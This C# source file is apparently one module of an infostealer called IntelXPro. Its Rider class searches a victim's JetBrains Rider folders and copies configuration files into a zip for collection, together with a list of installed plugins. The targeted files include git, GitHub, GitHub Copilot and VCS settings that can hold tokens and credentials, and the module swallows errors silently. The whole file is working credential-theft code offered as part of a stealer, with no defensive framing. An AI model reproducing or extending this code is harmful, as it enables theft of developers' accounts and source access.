using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Rider : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JetBrains");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "JetBrains");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Rider";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromJetBrainsDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromJetBrainsDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromJetBrainsDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] riderDirs = Directory.GetDirectories(basePath, "Rider*", SearchOption.TopDirectoryOnly);

                foreach (string riderDir in riderDirs)
                {
                    string versionName = Path.GetFileName(riderDir);

                    string optionsPath = Path.Combine(riderDir, "options");
                    if (Directory.Exists(optionsPath))
                    {
                        string[] configFiles = new string[]
                        {
                            "git.xml",
                            "github.xml",
                            "github-copilot.xml",
                            "vcs.xml",
                            "project.default.xml",
                            "ide.general.xml",
                            "editor.xml",
                            "other.xml"
                        };

                        foreach (string configFile in configFiles)
                        {
                            string fullPath = Path.Combine(optionsPath, configFile);
                            if (File.Exists(fullPath))
                            {
                                string zipPath = $"Applications\\Rider\\{location}\\{versionName}\\options\\{configFile}";
                                zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                                counterApplications.Files.Add(fullPath + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }

                    string pluginsPath = Path.Combine(riderDir, "plugins");
                    if (Directory.Exists(pluginsPath))
                    {
                        string[] pluginDirs = Directory.GetDirectories(pluginsPath);
                        
                        if (pluginDirs.Length > 0)
                        {
                            StringBuilder pluginsList = new StringBuilder();
                            pluginsList.AppendLine("Installed Plugins:");
                            pluginsList.AppendLine();
                            
                            foreach (string pluginDir in pluginDirs)
                            {
                                string pluginName = Path.GetFileName(pluginDir);
                                pluginsList.AppendLine("- " + pluginName);
                            }
                            
                            string zipPath = $"Applications\\Rider\\{location}\\{versionName}\\plugins_list.txt";
                            zip.AddTextFile(zipPath, pluginsList.ToString());
                            counterApplications.Files.Add(zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
